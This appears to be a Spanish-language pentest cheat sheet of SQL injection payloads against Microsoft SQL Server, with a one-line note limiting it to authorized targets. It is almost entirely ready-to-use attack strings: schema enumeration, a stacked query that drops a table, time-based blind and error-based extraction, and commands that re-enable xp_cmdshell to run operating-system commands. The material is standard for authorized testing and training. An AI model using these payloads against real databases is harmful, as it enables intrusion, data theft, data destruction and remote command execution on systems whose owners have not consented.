# SQLi — Microsoft SQL Server (MSSQL)

Ver índice: [sqli.md](sqli.md). **Solo sobre objetivos autorizados.**

## Comentarios

```
-- -      /* */
```

## Info básica

```sql
SELECT @@version;
SELECT DB_NAME();          -- BD actual
SELECT SYSTEM_USER;        -- usuario
SELECT user_name();
```

## Concatenación

```sql
'a'+'b'          CONCAT(a,b)
```

## Enumeración del esquema

```sql
SELECT name FROM sys.databases;
SELECT name FROM sysobjects WHERE xtype='U';         -- tablas
SELECT name FROM syscolumns WHERE id=OBJECT_ID('users');
-- o information_schema
SELECT table_name FROM information_schema.tables;
```

## Stacked queries (MSSQL sí las permite)

```sql
'; DROP TABLE x-- -
'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;-- -
```

## Blind — time-based

```sql
'; IF (1=1) WAITFOR DELAY '0:0:5'-- -
'; IF (SUBSTRING(DB_NAME(),1,1)='a') WAITFOR DELAY '0:0:5'-- -
```

## Error-based

```sql
' AND 1=CONVERT(int,(SELECT @@version))-- -
' AND 1=(SELECT TOP 1 name FROM sysobjects)-- -
```

## RCE clásica (si está habilitado / privilegios)

```sql
'; EXEC xp_cmdshell 'whoami'-- -
-- habilitar si procede:
'; EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;-- -
```

## Notas

- Soporta stacked queries → muy potente.
- `xp_cmdshell` suele estar deshabilitado; requiere privilegios para reactivarlo.
